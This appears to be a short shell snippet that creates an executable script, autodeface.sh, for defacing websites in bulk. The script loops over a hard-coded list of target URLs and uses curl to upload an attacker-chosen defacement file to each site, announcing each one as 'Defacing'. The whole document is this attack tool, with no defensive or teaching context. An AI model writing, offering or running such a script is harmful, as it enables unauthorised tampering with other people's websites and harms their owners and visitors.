cat > autodeface.sh << EOF
#!/bin/bash
targets=( "http://site1.com" "http://site2.com" )
read -p "Path file deface: " file
for site in "\${targets[@]}"; do
   echo "Defacing \$site ..."
   curl -T \$file \$site
done
EOF
chmod +x autodeface.sh
